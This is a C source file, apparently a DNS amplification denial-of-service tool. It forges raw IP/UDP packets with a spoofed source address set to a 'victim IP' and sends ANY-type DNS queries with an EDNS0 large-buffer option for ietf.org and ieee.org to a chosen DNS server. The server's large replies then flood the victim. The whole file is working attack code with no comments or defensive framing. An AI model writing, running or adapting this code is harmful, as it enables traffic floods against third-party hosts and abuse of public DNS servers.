#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/time.h>
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>


typedef struct iphdr iph;
typedef struct udphdr udph;

typedef struct
{
    u_int32_t saddr;
    u_int32_t daddr;
    u_int8_t filler;
    u_int8_t protocol;
    u_int16_t len;
}ps_hdr;


typedef struct
{
	unsigned short id;
	unsigned short flags;
	unsigned short qcount;
	unsigned short ans;	
	unsigned short auth;
	unsigned short add;
}dns_hdr;

typedef struct
{
	unsigned short qtype;
	unsigned short qclass;
  	unsigned short opt1;
  	unsigned short opt2;
  	unsigned short opt3;
  	unsigned short opt4;
  	unsigned short opt5;
  	unsigned short opt6;

}query;

void dns_send(char *victim_ip, int victim_p, char *dns_srv, int dns_p, unsigned char *dns_record);


unsigned short csum(unsigned short *ptr,int nbytes) 
{
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((unsigned char *)&oddbyte)=*(unsigned char *)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	
	return(answer);
}

void dns_format(unsigned char * dns,unsigned char * host) 
{
	int lock = 0 , i;
	strcat((char*)host,".");
	for(i = 0 ; i < strlen((char*)host) ; i++) 
	{
		if(host[i]=='.') 
		{
			*dns++ = i-lock;
			for(;lock<i;lock++) 
			{
				*dns++=host[lock];
			}
			lock++;
		}
	}
	*dns++=0x00;
}

void dns_hdr_create(dns_hdr *dns)
{
	dns->id = (unsigned short) htons(0xedbd);
	dns->flags = htons(0x0100);
	dns->qcount = htons(0x0001);
	dns->ans = htons(0x0000);
	dns->auth = htons(0x0000);
	dns->add = htons(0x0001);
}

void dns_send(char *victim_ip, int victim_p, char *dns_srv, int dns_p,
	unsigned char *dns_record)
{
	
	unsigned char dns_data[128];
	dns_hdr *dns = (dns_hdr *)&dns_data;
	dns_hdr_create(dns);
	unsigned char *dns_name, dns_rcrd[32];
	dns_name = (unsigned char *)&dns_data[sizeof(dns_hdr)];
	strcpy(dns_rcrd, dns_record);
	dns_format(dns_name , dns_rcrd);
	
	query *q;
	q = (query *)&dns_data[sizeof(dns_hdr) + (strlen(dns_name)+1)];
	q->qtype = htons(0x00ff);
	q->qclass = htons(0x0001);
	q->opt1 = htons(0x0000);
	q->opt2 = htons(0x2910);
	q->opt3 = htons(0x0000);
	q->opt4 = htons(0x0080);
	q->opt5 = htons(0x0000);
	q->opt6 = htons(0x00);

	
	char datagram[4096], *data, *psgram;
    memset(datagram, 0, 4096);
	data = datagram + sizeof(iph) + sizeof(udph);
    memcpy(data, &dns_data, sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query) +1);
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dns_p);
    sin.sin_addr.s_addr = inet_addr(dns_srv);
    
    iph *ip = (iph *)datagram;
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = sizeof(iph) + sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query);
    ip->id = htonl(getpid());
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    ip->saddr = inet_addr(victim_ip);
    ip->daddr = sin.sin_addr.s_addr;
	ip->check = csum((unsigned short *)datagram, ip->tot_len);
	
    udph *udp = (udph *)(datagram + sizeof(iph));
	udp->source = htons(victim_p);
    udp->dest = htons(dns_p);
    udp->len = htons(8+sizeof(dns_hdr)+(strlen(dns_name)+1)+sizeof(query));
    udp->check = 0;
	
	ps_hdr pshdr;
	pshdr.saddr = inet_addr(victim_ip);
    pshdr.daddr = sin.sin_addr.s_addr;
    pshdr.filler = 0;
    pshdr.protocol = IPPROTO_UDP;
    pshdr.len = htons(sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query));

	int pssize = sizeof(ps_hdr) + sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query);
    psgram = malloc(pssize);
    memcpy(psgram, (char *)&pshdr, sizeof(ps_hdr));
    memcpy(psgram + sizeof(ps_hdr), udp, sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query));
    udp->check = csum((unsigned short *)psgram, pssize);
    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    
    if(sd==-1){
    	printf("Socket error");
    }else{ 
    	sendto(sd, datagram, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
    }

	free(psgram);
	close(sd);
	
	return;
}

int main(int argc, char **argv)
{	
	if(argc<3){
		printf("- Usage %s <Victim IP> <UDP Source Port> <DNS Server IP>\n", argv[0]);
	}
	
	char *victim_ip = argv[1];
	int victim_p = atoi(argv[2]);
	char *dns_ip = argv[3];
	
	int count=3;
	while(count--) {
		dns_send(victim_ip, victim_p, dns_ip, 53, "ietf.org");
		dns_send(victim_ip, victim_p, dns_ip, 53, "ieee.org");
		sleep(2);
	}

	return 0;
}
